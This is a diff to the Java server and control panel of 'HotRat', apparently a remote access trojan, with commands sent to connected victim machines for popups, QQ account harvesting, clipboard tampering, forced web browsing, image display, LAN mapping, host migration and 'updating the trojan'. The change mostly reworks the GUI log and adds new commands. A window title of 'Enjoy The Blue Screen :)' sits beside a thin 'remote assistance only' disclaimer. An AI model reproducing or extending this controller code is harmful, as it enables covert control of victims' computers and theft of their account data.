@@ -24,13 +24,13 @@ import java.util.concurrent.Executors;
 public class Server {
     public static HashMap<String,Socket> map = new HashMap<>();
     public static DefaultTableModel defaultListModel;
+    public static DefaultTableModel defaultTableModel;
     static ServerSocket socket;
     static Socket mesocket;
     static String CFGPATH = System.getProperty("user.dir") + "\\Config.cfg";
     static String LookAndFeel = System.getProperty("user.dir") + "\\LookAndFeel.cfg";
     public static String port;
-    public static final String VERSION = "6.65";
-
+    public static final String VERSION = "7.35";
     static InputStream inputStream12 = Server.class.getClassLoader().getResourceAsStream("me/resources/maintable.png");
     static Image image12;
 
@@ -38,10 +38,8 @@ public class Server {
         try {
             image12 = ImageIO.read(inputStream12);
         } catch (IOException e) {
-            throw new RuntimeException(e);
         }
     }
-
     public static void main(String[] args) {
         try {
             File file = new File(LookAndFeel);
@@ -49,16 +47,27 @@ public class Server {
             ConfigWriter configWriter = new ConfigWriter(CFGPATH);
             configWriter1.CreateCFG("LookAndFeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
             configWriter.CreateCFG("port","11451");
-            JFrame frame = new JFrame("HotRat"+ VERSION + " |" + " 别远控了,恶俗b");
+            JFrame frame = new JFrame("HotRat"+ VERSION + " |" + " Enjoy The Blue Screen :)");
             if(file.exists()) {
                 UIManager.setLookAndFeel(ConfigReader.Read(LookAndFeel,"LookAndFeel"));
             }
             port = ConfigReader.Read(CFGPATH,"port");
-            JTextArea area = new JTextArea(4, 30);
-            area.setBackground(Color.black);
-            area.setForeground(Color.green);
-            area.setEditable(false);
-            Font font = new Font(Font.SERIF,Font.PLAIN,13);
+            defaultTableModel = new DefaultTableModel(null,new String[]{"时间","事件"});
+            Date date = new Date();
+            SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
+            JTable chatTable = new JTable(){
+                @Override
+                public boolean isCellEditable(int row, int column) {
+                    return false;
+                }
+            };
+            chatTable.setModel(defaultTableModel);
+            chatTable.setShowVerticalLines(false);
+            chatTable.setShowHorizontalLines(false);
+            chatTable.getTableHeader().setReorderingAllowed(false);
+            chatTable.getTableHeader().setResizingAllowed(false);
+            chatTable.getColumnModel().getColumn(0).setPreferredWidth(180);
+            chatTable.getColumnModel().getColumn(1).setPreferredWidth(600);
             InputStream inputStream = Server.class.getClassLoader().getResourceAsStream("me/resources/icon.png");
             Image image = ImageIO.read(inputStream);
             InputStream inputStream1 = Server.class.getClassLoader().getResourceAsStream("me/resources/1.png");
@@ -83,13 +92,8 @@ public class Server {
             Image image9 = ImageIO.read(inputStream9);
             InputStream inputStream11 = Server.class.getClassLoader().getResourceAsStream("me/resources/11.png");
             Image image11 = ImageIO.read(inputStream11);
-            area.setFont(font);
-            JScrollPane jScrollPane = new JScrollPane(area);
-            area.append("欢迎使用HotRat远程协助" + "\n");
-            area.append("本软件仅供学习交流 请勿用于非法用途 否则后果自负 一切与原作者无关" + "\n");
-            area.append("By RedRat Security Team" + "\n");
-            area.append("企鹅:511413324" + "\n");
-            area.append("监听端口:" + port + "\n");
+            JScrollPane jScrollPane = new JScrollPane(chatTable);
+            jScrollPane.setPreferredSize(new Dimension(0,100));
             frame.setIconImage(image);
             JMenuBar bar = new JMenuBar();
             JMenu menu = new JMenu("设置");
@@ -107,6 +111,11 @@ public class Server {
             JMenuItem jMenuItem10 = new JMenuItem("Luna");
             JMenuItem jMenuItem11 = new JMenuItem("HiFi");
             frame.add(jScrollPane,BorderLayout.SOUTH);
+            defaultTableModel.addRow(new String[]{format.format(date),"欢迎使用HotRat远程协助"});
+            defaultTableModel.addRow(new String[]{format.format(date),"本软件仅供于远程协助和远程维护 请勿用于非法用途"});
+            defaultTableModel.addRow(new String[]{format.format(date),"项目开源地址:https://github.com/Kr9jd/HotRAT"});
+            defaultTableModel.addRow(new String[]{format.format(date),"作者联系QQ:511413324"});
+            defaultTableModel.addRow(new String[]{format.format(date),"当前监听端口:" + port});
             JPanel panel = new JPanel();
             JButton button = new JButton("屏幕控制");
             button.setIcon(new ImageIcon(image1));
@@ -389,7 +398,7 @@ public class Server {
             button8.addActionListener(a->{
                 try {
                     new Thread(() -> {
-                        String[] modes = {"远程弹窗","远程获取QQ号","蜂鸣器","剪切板修改","闪屏","网页打开","转移主机","更新小马",};
+                        String[] modes = {"远程弹窗","远程获取QQ号","蜂鸣器","内网映射","剪切板修改","图片展示","关闭图片展示","闪屏","网页打开","转移主机","更新小马"};
                         String mode = (String) JOptionPane.showInputDialog(null,"更多功能","更多",JOptionPane.QUESTION_MESSAGE,null,modes,modes[0]);
                         int temp = table.getSelectedRow();
                         String strings = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
@@ -412,9 +421,19 @@ public class Server {
                                     String str =JOptionPane.showInputDialog(null,"闪屏文字..","闪屏",JOptionPane.INFORMATION_MESSAGE);
                                     SendMessage.Send(MessageFlags.FLASH_SCREEN,str.getBytes(StandardCharsets.UTF_8),map.get(strings));
                                 break;
+                            case "内网映射":
+                                SendMessage.SendHead(MessageFlags.LAN_ACCESS_OPEN,map.get(strings));
+                                break;
                             case "网页打开":
                                     String strs =JOptionPane.showInputDialog(null,"输入URL(如: http://baidu.com/)","输入",JOptionPane.INFORMATION_MESSAGE);
                                     SendMessage.Send(MessageFlags.WEB_BROWSE,strs.getBytes(StandardCharsets.UTF_8),map.get(strings));
+                                break;
+                            case "图片展示":
+                                String strs1 =JOptionPane.showInputDialog(null,"输入图片URL(如: http://baidu.com/)","输入",JOptionPane.INFORMATION_MESSAGE);
+                                SendMessage.Send(MessageFlags.PICTURE_SHOW,strs1.getBytes(),map.get(strings));
+                                break;
+                            case "关闭图片展示":
+                                SendMessage.SendHead(MessageFlags.PICTURE_CLOSE,map.get(strings));
                                 break;
                             case "转移主机":
                                 LoadNewHost.Load(map.get(strings));
@@ -451,7 +470,7 @@ public class Server {
             socket = new ServerSocket(Integer.parseInt(port));
             while (true) {
                 mesocket = socket.accept();
-                executorService.execute(new ClientPage(mesocket,defaultListModel,frame,area,table));
+                executorService.execute(new ClientPage(mesocket,defaultListModel,frame,table));
             }
         }catch (Exception e) {
             e.printStackTrace();
@@ -475,10 +494,8 @@ class ClientPage implements Runnable{
     DefaultTableModel tableModel;
     JFrame frame;
     JTable table;
-    static JTextArea area;
-    public ClientPage(Socket socket,DefaultTableModel tableModel,JFrame frame,JTextArea textArea,JTable table) {
+    public ClientPage(Socket socket,DefaultTableModel tableModel,JFrame frame,JTable table) {
         mesocket = socket;
-        area = textArea;
         this.table = table;
         this.tableModel = tableModel;
         this.frame = frame;
@@ -513,11 +530,11 @@ class ClientPage implements Runnable{
             Server.map.put(context, mesocket);
             Server.flashTable(table, tableModel);
             PlayMusic.online();
-            area.append("ip: [" + str5  + "]" +"有新主机上线请注意! 时间:"  +  format.format(date)  + "\n");
+            Server.defaultTableModel.addRow(new String[]{format.format(date),"主机上线:" + strings[1]});
             frame.setSize(1101,701);//强制刷新
             frame.setSize(1100,700);
             frame.repaint();
-            new SendHeartPack(mesocket,frame,area,str4,strings,table,tableModel,context).start();
+            new SendHeartPack(mesocket,frame,table,tableModel,context,strings[1]).start();
             new ReceiveMessage(mesocket,str5).start();
         }catch (Exception e) {
             e.printStackTrace();
